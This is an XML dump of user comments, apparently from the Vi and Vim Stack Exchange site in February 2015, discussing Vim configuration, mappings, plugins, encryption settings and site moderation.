  <row Id="365" PostId="361" Score="0" Text="Really? This history does not persist after quitting for me. (Vim 7.4.52, Ubuntu 14.04)" CreationDate="2015-02-04T21:45:54.420" UserId="88" />
  <row Id="366" PostId="361" Score="1" Text="@Doorknob maybe you switched it off? By default it keeps the history, and it's pretty handy. Good question, I'm curious to find out the answer." CreationDate="2015-02-04T21:47:09.147" UserId="135" />
  <row Id="367" PostId="357" Score="5" Text="You can even have multiple comma-separated colorcolumns!" CreationDate="2015-02-04T22:02:33.957" UserId="24" />
  <row Id="368" PostId="361" Score="2" Text="@Doorknob Make sure your `~/.viminfo` is owned by you.  A common mistake is for people to run `sudo vim ...` which, if you haven't run vim as your own user before, will create `~/.viminfo` as root.  If that is the problem, I'd suggest learning to use `sudoedit` or `sudo -e` to edit privileged files." CreationDate="2015-02-04T22:04:35.680" UserId="15" />
  <row Id="369" PostId="361" Score="0" Text="@jamessan Huh, it appears that was indeed the problem; `chown`'ing my .viminfo back to myself fixed it. (Not sure how its ownership got changed to root, since I've always used `sudoedit`, but oh well.)" CreationDate="2015-02-04T22:08:20.553" UserId="88" />
  <row Id="370" PostId="176" Score="0" Text="@romainl I understand now. It was a case of XY problem then. In this case is it appropriate to accept the best answer to the X or the best answer to the Y?" CreationDate="2015-02-04T22:37:05.227" UserId="161" />
  <row Id="371" PostId="364" Score="1" Text="Won't this really be better off at [security.se], given that you have already identified the algorithm(s) being used?" CreationDate="2015-02-04T22:49:28.343" UserId="205" />
  <row Id="372" PostId="364" Score="0" Text="@muru Well, it's a Vim question? I suppose it might be a good fit for both sites?" CreationDate="2015-02-04T22:49:47.317" UserId="51" />
  <row Id="374" PostId="190" Score="1" Text="I also really like the YouCompleteMe plugin, as it suggests as-you-type and you can either choose or ignore suggestions. Yes, visually it is hard to ignore,but it is very unintrusive in my workflow because it requires fewer key strokes." CreationDate="2015-02-04T22:51:05.783" UserId="322" />
  <row Id="376" PostId="348" Score="0" Text="You are right! I am pretty sure I had tested that, but I must have changed something. I have updated the script in the post, see if it is working for you now." CreationDate="2015-02-04T22:53:03.700" UserId="81" />
  <row Id="377" PostId="364" Score="0" Text="Hmm. The docs are a bit confusing here. `:h encryption` says undo and swap files are encrypted in both [7.3](http://vimdoc.sourceforge.net/htmldoc/editing.html#encryption) and [7.4](http://vimhelp.appspot.com/editing.txt.html#encryption), yet [`:h cryptmethod`](http://vimhelp.appspot.com/options.txt.html#%27cryptmethod%27) in 7.4 makes explicit mention of the `undo` file only for `blowfish2`." CreationDate="2015-02-04T23:00:07.497" UserId="205" />
  <row Id="378" PostId="189" Score="0" Text="I would add that output file is `vimrc.profile` in the current directory" CreationDate="2015-02-04T23:02:35.893" UserId="179" />
  <row Id="379" PostId="350" Score="1" Text="ah, I should have mentioned this - I'm running OS X, but SSHing into a Ubuntu server most of the time." CreationDate="2015-02-04T23:27:51.097" UserId="2" />
  <row Id="380" PostId="213" Score="0" Text="@alxndr then add `:let @/=&quot;&quot;&lt;C-R&gt;` to clear the last search." CreationDate="2015-02-04T23:29:49.990" UserId="142" />
  <row Id="381" PostId="213" Score="0" Text="It would also be nice to avoid modifying the search at all, in case I already have something highlighted which I'd like to keep highlighted... But I suppose that's the price of using the search feature." CreationDate="2015-02-04T23:34:16.637" UserId="67" />
  <row Id="382" PostId="273" Score="0" Text="Thanks for the explanation! It looks like I need to read up on text objects." CreationDate="2015-02-04T23:42:52.323" UserId="261" />
  <row Id="384" PostId="360" Score="0" Text="Similarly, you can switch to the other window with `Ctrl-w w` and close it with `Ctrl-w c`, leaving you with just the help." CreationDate="2015-02-04T23:47:57.403" UserId="141" />
  <row Id="386" PostId="370" Score="3" Text="This is also little better than a link-only answer." CreationDate="2015-02-04T23:51:06.903" UserId="24" />
  <row Id="387" PostId="372" Score="0" Text="I'm aware that OP's situation is different, but this is a valid answer for some users." CreationDate="2015-02-04T23:51:35.300" UserId="212" />
  <row Id="390" PostId="360" Score="0" Text="Picking highest voted answer." CreationDate="2015-02-05T00:06:11.530" UserId="189" />
  <row Id="392" PostId="364" Score="1" Text="@muru It's a question about Vim's implementation of blowfish-based encryption, not about the blowfish algorithm itself. This question would also be on-topic on [security.se], but that doesn't make it off-topic here. The answer is, in fact, that blowfish itself is secure (even if it isn't the best choice), but that Vim's implementation of it is bad." CreationDate="2015-02-05T00:17:55.180" UserId="8" />
  <row Id="393" PostId="364" Score="0" Text="@Gilles To be fair, the original question *also* asked about Blowfish. This was a mistake, and I've edited the  question since and removed it (I already know the answer, anyway). So muru was right :-)" CreationDate="2015-02-05T00:18:46.617" UserId="51" />
  <row Id="394" PostId="351" Score="0" Text="@janos Mine not only un-indents `.chainCall2()`, it _indents_ the `var` line to match `.chainCall1()`  =o_0=" CreationDate="2015-02-05T00:26:33.993" UserId="238" />
  <row Id="397" PostId="213" Score="2" Text="If you want to protect your existing search you can prepend `:let searchbak=@/&lt;CR&gt;` and append `:let @/=searchbak&lt;CR&gt;`. But at this point it's getting kind of long and unapproachable and maybe should just be a function." CreationDate="2015-02-05T01:18:44.963" UserId="195" />
  <row Id="398" PostId="301" Score="2" Text="How about mimicking `jk`? Find two keys which are adjacent in Dvorak but not common combinations in your preferred language. `tn`, for example, is the positional equivalent of `jk`." CreationDate="2015-02-05T01:19:55.127" UserId="212" />
  <row Id="399" PostId="303" Score="2" Text="Agreed. Habitual use of `&lt;C-c&gt;` can subtly break plugins and autocmds." CreationDate="2015-02-05T01:22:39.440" UserId="212" />
  <row Id="400" PostId="386" Score="0" Text="I like this. It's an available, open mapping with a clear mnemonic." CreationDate="2015-02-05T02:06:25.230" UserId="130" />
  <row Id="401" PostId="386" Score="2" Text="I think `&lt;esc&gt;BdiWi` might be better. `vBda` doesn't seem to behave consistently (try inside, for example, `db:seed`)." CreationDate="2015-02-05T02:15:21.303" UserId="205" />
  <row Id="403" PostId="350" Score="0" Text="That's good news! If the vim on the other end of the ssh responds to the scroll events, then your terminal emulator is sending the scroll events through and the answer above should work for you, both locally running vim and remotely running vim. If you comment with the name of your terminal emulator, I'll add it to the answer." CreationDate="2015-02-05T03:13:22.037" UserId="227" />
  <row Id="404" PostId="386" Score="2" Text="When doing one of normal mode commands from insert mode, consider using `&lt;C-o&gt;` instead" CreationDate="2015-02-05T03:24:05.020" UserId="74" />
  <row Id="405" PostId="390" Score="9" Text="Just to be clear, pathogen is not a plugin manager. All it does is manage the runtimepath. That's it. Any plugins you add to ~/.vim/bundle (i.e. the default location, you can change this), it adds the plugin's files to vim's runtimepath so they are accessible. The manually installing, updating, removing is not really a con if you don't have that many plugins installed. Additionally, when updating plugins, you can choose to fetch only a subset of the changes, and not update to the latest version of a plugin, which gives you a lot of control." CreationDate="2015-02-05T03:24:09.203" UserId="246" />
  <row Id="406" PostId="390" Score="1" Text="@AkshayHegde Yes, once I started writing the Vundle answer I had to go back and edit out &quot;plugin manager&quot; from this answer. Seconded about the con, that's why I continue to use it instead of anything else." CreationDate="2015-02-05T03:30:00.383" UserId="205" />
  <row Id="407" PostId="128" Score="0" Text="I think you meant %:p: **t** will return text.txt" CreationDate="2015-02-05T04:20:27.913" UserId="227" />
  <row Id="410" PostId="321" Score="1" Text="This doesn't work for selecting a single word in a line. (see question mentions word level selection)" CreationDate="2015-02-05T04:40:57.207" UserId="301" />
  <row Id="412" PostId="400" Score="1" Text="This seems very similar to this other question: http://vi.stackexchange.com/questions/9/can-i-implement-vim-macros-using-python" CreationDate="2015-02-05T07:00:07.830" UserId="135" />
  <row Id="413" PostId="400" Score="3" Text="Asking for resources isnt a question with a definitive answer. Like asking for a tutorial or a good book." CreationDate="2015-02-05T07:04:36.197" UserId="301" />
  <row Id="415" PostId="190" Score="3" Text="I've changed the animations to be &quot;on click&quot;, in the sense that they are linked to the gif animations." CreationDate="2015-02-05T07:06:13.840" UserId="130" />
  <row Id="417" PostId="400" Score="2" Text="I would agree that I'm asking for a tutorial (or a good book were it only to exist). I wouldn't agree that it's a bad thing. I must admit that I'm colored by [math.se], which uses the [tag:reference-request] tag as a way to direct new learners towards good resources instead of being lost in the vast ocean of mediocrity that is the standard level of resources out there." CreationDate="2015-02-05T07:10:07.583" UserId="130" />
  <row Id="418" PostId="363" Score="0" Text="An aside, if this is reStructuredText, you might consider looking into `list-table` (recently I converted many tables to this, because ascii tables are hard to maintain and diff poorly)" CreationDate="2015-02-05T07:11:17.077" UserId="301" />
  <row Id="419" PostId="400" Score="1" Text="Treatment of this genre of questions [is being discussed on Meta](http://meta.vi.stackexchange.com/q/38/24)." CreationDate="2015-02-05T07:27:25.497" UserId="24" />
  <row Id="423" PostId="85" Score="0" Text="Treatment of this genre of questions [is being discussed on Meta](http://meta.vi.stackexchange.com/q/38/24)." CreationDate="2015-02-05T07:34:32.943" UserId="24" />
  <row Id="424" PostId="176" Score="1" Text="@Kit, that's one of the many problems with XY problem qustions. The most upvoted answer is a high-quality direct answer to your question but ultimately useless in the context of your real problem while my less upvoted answer is an actual solution to your underlying problem. Both answers are correct but they answer different questions which makes it hard for you to decide. If it was me, I would accept the answer that addresses my core issue… but that's just me." CreationDate="2015-02-05T07:38:00.383" UserId="54" />
  <row Id="425" PostId="405" Score="2" Text="This is not naïve by any means." CreationDate="2015-02-05T07:42:50.317" UserId="54" />
  <row Id="426" PostId="405" Score="2" Text="@romainl it's only naive until you map it to something shorter I guess" CreationDate="2015-02-05T07:55:58.127" UserId="74" />
  <row Id="427" PostId="299" Score="0" Text="@derobert `setlocal syntax=OFF` works, although not with `BufReadPre *` - I had to change the autocommand back to `Filetype xml` for this. Seems like it's nontrivial which commands work in which autocommand contexts..." CreationDate="2015-02-05T08:34:41.877" UserId="117" />
  <row Id="428" PostId="135" Score="0" Text="In case of you didn't know about 'u' - undo." CreationDate="2015-02-05T08:51:48.193" UserId="336" />
  <row Id="429" PostId="410" Score="0" Text="I kind of get your desire to fill up this site with as many questions as possible but… that question has been answered dozens of times over the years on SO/SU and elsewhere: `xargs` uses a dummy `stdin` that can't be used by Vim and breaks everything afterwards." CreationDate="2015-02-05T09:08:41.727" UserId="54" />
  <row Id="430" PostId="410" Score="1" Text="@romainl I'm not active on those sites, and I've never seen it asked there — honest." CreationDate="2015-02-05T09:09:42.850" UserId="24" />
  <row Id="437" PostId="365" Score="1" Text="would really like to know the answer to this, I would suggest that it will be possible with syntax highlighting this post on SO may be relevant http://stackoverflow.com/questions/7033310/vim-custom-syntax-highlighting-background-only" CreationDate="2015-02-05T10:24:26.147" UserId="11" />
  <row Id="438" PostId="405" Score="1" Text="I prefer Y instead of yy, because I find it slower to type doubled characters in general." CreationDate="2015-02-05T10:36:54.047" UserId="135" />
  <row Id="439" PostId="407" Score="2" Text="This doesn't really apply for `map`. The '\' is used to escape key codes when using `normal` via `execute` calls. Very confusing imho. Example from the `execute` help: `:execute &quot;normal ixxx\&lt;Esc&gt;&quot;`. The use in `mapleader` is probably related to that. Or it just accepts `expr-string`s." CreationDate="2015-02-05T10:50:05.550" UserId="20" />
  <row Id="440" PostId="410" Score="0" Text="Related: http://superuser.com/questions/336016/invoking-vi-through-find-xargs-breaks-my-terminal-why - perhaps someone can condense the top answers to a great answer." CreationDate="2015-02-05T10:53:06.147" UserId="205" />
  <row Id="442" PostId="308" Score="2" Text="Tim Pope released [vim-haystack](https://github.com/tpope/vim-haystack) today. It sounds similar to what you need. Maybe you can get some inspiration from it or maybe even use it." CreationDate="2015-02-05T11:38:47.747" UserId="20" />
  <row Id="443" PostId="413" Score="1" Text="I would suggest &quot;s/recommand/recommend/&quot;, &quot;s/already exist options/already existing options/&quot;, &quot;s/then set capslock as additional ctrl/then sets capslock as an additional ctrl/&quot;, &quot;s/may useful in case of you have/may be useful in case you have/&quot;, &quot;s/is other options relate/are other options related to/&quot;. Apologies for not doing it myself, but don't have the rep yet" CreationDate="2015-02-05T11:42:01.607" UserId="182" />
  <row Id="444" PostId="128" Score="0" Text="@JohnO'M. yep, that's right thanks :D. Fixed." CreationDate="2015-02-05T12:43:06.863" UserId="133" />
  <row Id="445" PostId="389" Score="2" Text="Agreed. I've had lots of problems with YCM (including the mentioned segfaults). And even after hours of configuration, I never had it fully working." CreationDate="2015-02-05T12:45:12.790" UserId="133" />
  <row Id="446" PostId="406" Score="1" Text="Do you mean &quot;leaving just Control+[&quot; rather than &quot;leaving just Escape+[&quot;?" CreationDate="2015-02-05T12:51:54.620" UserId="343" />
  <row Id="455" PostId="429" Score="1" Text="+1 for an answer. However (and correct me if I am wrong) but `guibg` only works for gvim, is that right?" CreationDate="2015-02-05T14:35:57.263" UserId="307" />
  <row Id="456" PostId="429" Score="1" Text="@Karolis Yes. For terminal Vim you need to use `ctermbg`, as stated." CreationDate="2015-02-05T14:38:27.033" UserId="343" />
  <row Id="460" PostId="423" Score="1" Text="Note: I like to use `set listchars=tab:!·,trail:·`, IMHO `·` is a lot clearer than a `-` ... You need a fairly recent Vim version for this to work btw (not sure which exactly, I think 7.3.x)..." CreationDate="2015-02-05T15:07:15.977" UserId="51" />
  <row Id="461" PostId="429" Score="1" Text="If you use folds, then you get what you want: The folds have a different bg colour, however, this is accomplished by filling the background with space characters which have a different bg colour set... This causes some side-effects: copy/paste won't properly work anymore (as it will also copy a lot of space characters, this is also how you can verify this for yourself)." CreationDate="2015-02-05T15:11:17.650" UserId="51" />
  <row Id="462" PostId="430" Score="1" Text="See also `set lcs=tab:├─`" CreationDate="2015-02-05T15:33:43.393" UserId="348" />
  <row Id="463" PostId="387" Score="0" Text="I used to use a variant of this: Just use `:%s/pattern/replace/` and then press `u` for undo, you can see the parts that Vim changed if you have `hlsearch` enabled. And you can replace this text again with `^R`." CreationDate="2015-02-05T15:35:39.033" UserId="51" />
  <row Id="465" PostId="389" Score="0" Text="I had YCM server crashed numerous times , looking forward to clang_complete , here is relevant information for other users : https://github.com/Rip-Rip/clang_complete/blob/master/doc/clang_complete.txt" CreationDate="2015-02-05T16:12:30.970" UserId="101" />
  <row Id="468" PostId="436" Score="0" Text="Hm, still doesn't seem to do anything? It works as if I use `set t_te=`, but it's supposed to do more, I think?" CreationDate="2015-02-05T16:27:12.963" UserId="51" />
  <row Id="469" PostId="418" Score="0" Text="Thank you, this is a really great answer. Works for any number of lines and can even be modified to include other characters (not only #) easily. Shame I can only give 1 upvote and accept only a single answer. This time I had to go with the one I am more familiar with (and writing functions - I am not familiar with that, but thanks to you I see how they work)." CreationDate="2015-02-05T16:38:01.087" UserId="307" />
  <row Id="470" PostId="90" Score="1" Text="@yo' I think you mean `5gj`" CreationDate="2015-02-05T17:23:15.813" UserId="51" />
  <row Id="471" PostId="172" Score="0" Text="Why do you use `'s` as a pattern? Isn't just searching for `'` correct, asl well? This will miss words that have a `'`  in a different location (such as `you'd`, `you've`, etc.)" CreationDate="2015-02-05T17:44:40.693" UserId="51" />
  <row Id="472" PostId="413" Score="0" Text="This is a nice workaround, but I've already remapped [CapsLock] to be my [Control]..." CreationDate="2015-02-05T18:20:17.320" UserId="67" />
  <row Id="473" PostId="441" Score="3" Text="Without `'wildmenu'`, you get one completion after another via Tab, or still the whole list with Ctrl-D. Suggest mentioning that." CreationDate="2015-02-05T18:20:28.777" UserId="31" />
  <row Id="474" PostId="406" Score="0" Text="Whoops, thanks @Rich!" CreationDate="2015-02-05T18:21:12.277" UserId="67" />
  <row Id="475" PostId="443" Score="0" Text="Makes sense. I was hoping there was something more simple, without visual mode." CreationDate="2015-02-05T18:44:12.150" UserId="226" />
  <row Id="476" PostId="443" Score="0" Text="@aharris88 I did a little research on this and I can't find a simpler way to do it. I'd love to be proven wrong, though!" CreationDate="2015-02-05T18:46:48.113" UserId="2" />
  <row Id="477" PostId="441" Score="0" Text="@derobert Ah, didn't know that. I'm so used to using `Tab` :-)" CreationDate="2015-02-05T18:47:53.317" UserId="51" />
  <row Id="478" PostId="443" Score="1" Text="You can always rebind this key combination to something else (like `noremap p Vp`)." CreationDate="2015-02-05T18:57:47.883" UserId="51" />
  <row Id="480" PostId="443" Score="0" Text="Yeah, but `p` is too useful to overwrite. `Vp` is fine. I don't need it that often." CreationDate="2015-02-05T19:06:40.047" UserId="226" />
  <row Id="481" PostId="393" Score="0" Text="You should accept your own answer. It seems to completely resolve the question." CreationDate="2015-02-05T19:16:28.530" UserId="126" />
  <row Id="485" PostId="410" Score="1" Text="Great question - this has happened to me numerous times. Also, I don't use any other SO sites - if it's vim-related, I'd like to find it here." CreationDate="2015-02-05T19:38:43.450" UserId="248" />
  <row Id="486" PostId="172" Score="0" Text="Yep, you're right. I've edited my answer." CreationDate="2015-02-05T19:52:17.527" UserId="142" />
  <row Id="490" PostId="298" Score="0" Text="possible duplicate of [How can I open very large files with good performance?](http://vi.stackexchange.com/questions/149/how-can-i-open-very-large-files-with-good-performance)" CreationDate="2015-02-05T20:01:02.250" UserId="91" />
  <row Id="491" PostId="172" Score="0" Text="Thanks :-) I wasn't sure if you did that with a reason, so was hesitant to edit it myself..." CreationDate="2015-02-05T20:01:14.197" UserId="51" />
  <row Id="492" PostId="298" Score="0" Text="Although this Q is well written, it does seem to cover broadly the same ground (in fact, a subset) of this one: http://vi.stackexchange.com/questions/149/how-can-i-open-very-large-files-with-good-performance" CreationDate="2015-02-05T20:01:26.560" UserId="91" />
  <row Id="494" PostId="402" Score="0" Text="It doesn't directly answer your question, but it's worth saying that some markup langs (e.g. Markdown) also support a leading `#` character instead for a level 1 heading, `##` for level 2, etc. That's how I write Markdown, and I find it clearer that way anyway." CreationDate="2015-02-05T20:12:59.427" UserId="91" />
  <row Id="495" PostId="457" Score="6" Text="`Q` and `q:` are quite different.  You're only referring to `Q` right?" CreationDate="2015-02-05T20:21:08.863" UserId="15" />
  <row Id="498" PostId="457" Score="0" Text="@jamessan, actually, it turns out that I wasn't sure ... you're right, they do seem to do different things, although I had assumed they were basically the same. If you answer this question, it might help to clarify there, as I'm obviously confused." CreationDate="2015-02-05T20:25:43.917" UserId="91" />
  <row Id="501" PostId="298" Score="3" Text="@AndrewFerrier I'd argue against that. The other question is about general tips for handling big files. Mine is about _implementing_ one rather specific piece of the puzzle under a given set of restrictions. Just compare the answers - the answers to the other question will tell me to turn off syntax, but not how to do that dynamically in a single buffer for a single file type. Thus it will not solve my far more specific problem. They're related but not duplicates as they ask for different things and lead to different responses." CreationDate="2015-02-05T20:33:14.857" UserId="117" />
  <row Id="502" PostId="459" Score="0" Text="@aharris88 - A yes, that does appear to be a proper solution, I just missed it. I'm more interested in recovery of a session after quitting vim, so perhaps there's a simpler solution other than using `:mksession` and saving session state to a file?" CreationDate="2015-02-05T20:35:15.037" UserId="323" />
  <row Id="503" PostId="298" Score="0" Text="l4mpi, that's a fair point, I hadn't spotted the filetype thing too. Just testing the waters of the new beta here partially! Point taken. I'll withdraw my duplicate vote." CreationDate="2015-02-05T20:35:54.223" UserId="91" />
  <row Id="504" PostId="463" Score="0" Text="OK, thanks. Are you sure `q:` *is* the Ex command-line? The help only uses the phrase &quot;Ex&quot; for he mode brought up by `Q`, but that doesn't support the standard vim editing you are referring to - only `q:` does, which the help simply calls 'Command line mode'. I know I confused the two at first, but we should probably make sure we are clear about the distinction here." CreationDate="2015-02-05T20:40:57.320" UserId="91" />
  <row Id="505" PostId="463" Score="1" Text="I searched `:help q:` before I decided to use that phrase, but I might be confused about the terminology." CreationDate="2015-02-05T20:42:59.560" UserId="141" />
  <row Id="506" PostId="141" Score="0" Text="@CodyPoll I know. Everything is ok up to `I`. When I press `I`, then the `#` will be placed only in front of the first line." CreationDate="2015-02-05T20:43:59.733" UserId="83" />
  <row Id="507" PostId="463" Score="0" Text="You're right, I just spotted it: &quot;From Normal mode, use the &quot;q:&quot;, &quot;q/&quot; or &quot;q?&quot; command. This starts editing an Ex command-line (&quot;q:&quot;)&quot;. Thanks." CreationDate="2015-02-05T20:44:16.070" UserId="91" />
  <row Id="508" PostId="463" Score="1" Text="I've been confused about this terminology too.  I usually talk about typing an Ex command as anything following `:`, but I could be using that wrong." CreationDate="2015-02-05T20:45:51.693" UserId="141" />
  <row Id="509" PostId="221" Score="3" Text="FYI, as of Vim 7.4.480, `*.md` files are recognized as Markdown instead of modula2 by default." CreationDate="2015-02-05T20:49:38.837" UserId="300" />
  <row Id="510" PostId="466" Score="0" Text="Your answer says no, but it seems like that works great!" CreationDate="2015-02-05T21:00:08.017" UserId="226" />
  <row Id="511" PostId="466" Score="0" Text="(I meant &quot;no&quot; in the sense that you can't do it without re-opening files). Does it actually renumber from 1 for you though? I thought it did when I first tried it, but now I'm seeing it *not* renumber for me?" CreationDate="2015-02-05T21:01:05.163" UserId="72" />
  <row Id="512" PostId="446" Score="0" Text="This is (probably) in reference to a cleaning product named &quot;vim&quot; that was quite common in the Netherlands (AFAIK it doesn't exist any more)." CreationDate="2015-02-05T21:01:38.903" UserId="51" />
  <row Id="513" PostId="466" Score="0" Text="Yeah, it renumbers for me." CreationDate="2015-02-05T21:03:51.260" UserId="226" />
  <row Id="514" PostId="466" Score="0" Text="Yeah, I'm just dumb, I found my mistake." CreationDate="2015-02-05T21:04:09.387" UserId="72" />
  <row Id="515" PostId="215" Score="1" Text="I disable this keybinding/mode with `map q: &lt;Nop&gt;` in ~/.vimrc, as I find it very irritating, and never really use it." CreationDate="2015-02-05T21:21:10.800" UserId="91" />
  <row Id="516" PostId="469" Score="0" Text="I don't believe that is a standard file for vim to create. Can you please try running vim with `-u NONE` (i.e. no `~/.vimrc` to see if it still does it?" CreationDate="2015-02-05T21:36:57.210" UserId="91" />
  <row Id="517" PostId="469" Score="0" Text="@AndrewFerrier That's  a negative. Also it only does it for files in some directories. I tested in a scratch area and it doesn't do it, but for example a git repo with a bunch of LaTeX stuff in it leaves them behind on every edit." CreationDate="2015-02-05T21:42:02.817" UserId="267" />
  <row Id="518" PostId="349" Score="0" Text="About pressing the `Ctrl` key (at the regular position) **without** twisting the little finger: you can press it with the external palm of the hand, as it is described well [here](http://ergoemacs.org/emacs/emacs_pinky.html)  (I found this nice clever trick on the 'Net, time to give it back :) and kudos to who invented it)" CreationDate="2015-02-05T21:42:57.677" UserId="311" />
  <row Id="519" PostId="469" Score="0" Text="So it sounds to me, therefore, like you are loading a plugin which does that instead. Suggest you do a binary search (aka comment half of them) for the plugins you have installed to narrow down the culprit." CreationDate="2015-02-05T21:43:54.517" UserId="91" />
  <row Id="520" PostId="469" Score="1" Text="@AndrewFerrier How about `grep -R project.vim ~/.vim`? It looks like [Automatic LaTeX Plugin](http://atp-vim.sourceforge.net/) is to blame. I edit so many LaTeX files these days I didn't notice it wasn't happening except on these. That gives me a place to look for how to shut it off. Either I'll answer someday or anybody that looks up how ATP works can answer..." CreationDate="2015-02-05T21:57:02.230" UserId="267" />
  <row Id="521" PostId="470" Score="0" Text="Here is some bonus information that is not really part of the answer: For me, on OpenSUSE, gvim (the GTK GUI for vim) does this automatically when it gains focus. I don't really know why it does it and I haven't checked on other systems but I thought it might be useful as an extra. Maybe someelse can confirm?" CreationDate="2015-02-05T22:05:39.807" UserId="20" />
  <row Id="522" PostId="141" Score="0" Text="@CodyPoll Ok.. I was just inpatient. I did not press `Esc` after the procedure described." CreationDate="2015-02-05T22:07:26.137" UserId="83" />
  <row Id="523" PostId="141" Score="0" Text="@gon1332 as far as I know you need to press `Esc` at the end." CreationDate="2015-02-05T22:07:57.487" UserId="356" />
  <row Id="525" PostId="471" Score="0" Text="I'm voting to close as Too Broad because you're asking for a list of &quot;pros and cons of each method,&quot; which doesn't fit well with the Stack Exchange Q&amp;A format." CreationDate="2015-02-05T22:14:55.933" UserId="88" />
  <row Id="526" PostId="471" Score="3" Text="@Doorknob I'm pretty sure (I asked this having done some homework first!) there are only about 6 factors to consider here (e.g. speed of reading, order of precedence, what defaults can or can't be touched, how you sync settings between computers, etc.) I don't see how this can't be dealt with pretty thoroughly in the space of a good answer." CreationDate="2015-02-05T22:17:29.360" UserId="267" />
  <row Id="527" PostId="471" Score="7" Text="I think the question is appropriate as a question about why gvimrc exists, rather than a list of pros and cons." CreationDate="2015-02-05T22:20:05.970" UserId="72" />
  <row Id="528" PostId="471" Score="2" Text="Sounds reasonable. Close vote retracted." CreationDate="2015-02-05T22:38:17.703" UserId="88" />
  <row Id="530" PostId="474" Score="0" Text="@aharris88 Did you read my question and that question? This is entirely about python. That has nothing to do with python. I chose this challenge for no other reason than I liked that question" CreationDate="2015-02-05T23:07:29.607" UserId="130" />
  <row Id="531" PostId="474" Score="1" Text="Yes, you're right. Sorry. I didn't realize the distinction between python and vim." CreationDate="2015-02-05T23:10:22.713" UserId="226" />
  <row Id="532" PostId="474" Score="7" Text="Hmm, this one is borderline, but I'd consider this more of a question for [so]. I won't closevote, but I'm worried questions like these are going to turn the site into just an SO clone." CreationDate="2015-02-05T23:11:54.080" UserId="88" />
  <row Id="534" PostId="457" Score="0" Text="This question is being [discussed on Meta](http://meta.vi.stackexchange.com/q/129/24)." CreationDate="2015-02-05T23:39:28.733" UserId="24" />
  <row Id="537" PostId="471" Score="0" Text="One specific example which I find useful is `winpos` which changes the position of the window used by gvim. This has no effect (and makes no sense) within `~/.vimrc`, it has to be in `~/.gvimrc`" CreationDate="2015-02-06T00:02:25.973" UserId="182" />
  <row Id="540" PostId="477" Score="0" Text="http://vim.wikia.com/wiki/List_changes_to_the_current_file#Capturing_list_of_change_locations ... Might be a good place to start ... No time to write a full answer now ;-)" CreationDate="2015-02-06T00:11:40.443" UserId="51" />
  <row Id="541" PostId="480" Score="3" Text="In order for this to work the syntax file you are using should make use of `syn-fold`. in my installation of vim74, only about 10% of the syntax files use it." CreationDate="2015-02-06T00:15:04.057" UserId="182" />
  <row Id="542" PostId="479" Score="1" Text="I've long had it mapped to `W`, but `w!!` makes much more sense, shall update my .vimrc. Thanks" CreationDate="2015-02-06T00:17:50.540" UserId="182" />
  <row Id="543" PostId="483" Score="0" Text="Is there also a way to easily see which words Vim corrected? I ran this on a file, and it generated a lot of gobbledygook ..." CreationDate="2015-02-06T00:18:04.890" UserId="51" />
  <row Id="544" PostId="477" Score="0" Text="@Carpetsmoker thx for the link" CreationDate="2015-02-06T00:26:31.663" UserId="188" />
  <row Id="545" PostId="393" Score="0" Text="@xthrd You can only accept your own solution when 48 hours have passed." CreationDate="2015-02-06T00:38:31.787" UserId="189" />
  <row Id="546" PostId="488" Score="1" Text="by `&lt;cr&gt;` do you mean &quot;Press the enter key&quot;?" CreationDate="2015-02-06T01:47:33.943" UserId="360" />
  <row Id="547" PostId="488" Score="1" Text="@Oxinabox Yep. (That's just Vim's notation for a carriage return.)" CreationDate="2015-02-06T01:47:55.717" UserId="88" />
  <row Id="548" PostId="488" Score="1" Text="Which i would need to use if I was making a macro, Ok cool." CreationDate="2015-02-06T01:48:22.990" UserId="360" />
  <row Id="549" PostId="488" Score="0" Text="What happens to Wholefile.md. It still exists, right?" CreationDate="2015-02-06T02:14:03.327" UserId="226" />
  <row Id="550" PostId="488" Score="0" Text="@aharris88 yes, no modifications are made to Wholefile.md due to these commands." CreationDate="2015-02-06T02:20:29.860" UserId="205" />
  <row Id="551" PostId="402" Score="0" Text="@Andrew Ferrier, Im not using markdown &amp; the question isnt specifically about markdown, its just an example of a markup that can use titles like this. I listed 3x different markups especially to avoid discussion on the specifics on any of the markup languages." CreationDate="2015-02-06T03:16:24.473" UserId="301" />
  <row Id="552" PostId="489" Score="1" Text="While this is impressive (I'm rather new to vim, so I'm discovering new things every day!), I'm afraid this isn't at all what I need. Maybe I should look into making my own plugin? It seems like a fun thing to do." CreationDate="2015-02-06T03:31:43.627" UserId="359" />
  <row Id="553" PostId="489" Score="2" Text="@Lukas In what way doesn't a mapping in your .vimrc solve the problem? Simply hitting Ctrl-B will then automatically fill out the header file for you. (I should probably make it clear the header file before replacing it with an updated version, but I have to sleep so I might do that later.) A plugin does sound interesting; keep me updated if you decide to make one. And thanks for the interesting challenge to sharpen up my Vim skills! ;)" CreationDate="2015-02-06T03:52:37.030" UserId="88" />
  <row Id="554" PostId="483" Score="0" Text="How terrifying. So this calls the macro while it is still recording that same macro?" CreationDate="2015-02-06T04:28:19.173" UserId="360" />
  <row Id="555" PostId="446" Score="0" Text="@Carpetsmoker Oh, don't worry about that. Vim is alive and kicking in India (where I am). :D" CreationDate="2015-02-06T05:01:16.080" UserId="205" />
  <row Id="556" PostId="402" Score="0" Text="I understand. It was just an incidental comment for anyone who does. Your question is totally valid, I agree." CreationDate="2015-02-06T06:39:40.900" UserId="91" />
  <row Id="557" PostId="257" Score="2" Text="That tag is confusing me. If this question is about &quot;original vi&quot;, why is a `vim` answer accepted?" CreationDate="2015-02-06T08:00:51.830" UserId="205" />
  <row Id="558" PostId="257" Score="2" Text="@muru Agreed. Changing the question two days afterwards, even if it was originally misinterpreted, makes a mess. At this point, it would be better to change the question to Vim and ask another question for Original Vi. I've voted to close as &quot;Unclear what you are asking&quot;, and I would be glad to retract it if reverted." CreationDate="2015-02-06T08:04:08.303" UserId="24" />
  <row Id="559" PostId="257" Score="3" Text="I've reverted the tag; this question can stay open, the OP can ask a new question .... IMHO that's the easier ... Also, I think the the OP uses `nvi`?" CreationDate="2015-02-06T08:22:13.517" UserId="51" />
  <row Id="560" PostId="488" Score="0" Text="@Oxinabox: Note you can use `ctrl-V` for quoting any special characters or fancy keypresses for macros - just press `ctrl-V` then [enter] and the &lt;cr&gt; equivalent will be entered into your macro definition." CreationDate="2015-02-06T09:04:57.097" UserId="351" />
  <row Id="564" PostId="413" Score="1" Text="muru, jalanb Thanks for correct my terrible writing." CreationDate="2015-02-06T09:33:41.077" UserId="336" />
  <row Id="565" PostId="413" Score="0" Text="@alxndr This method could make [CapsLock] as both [Control] and [Escape]" CreationDate="2015-02-06T09:36:21.457" UserId="336" />
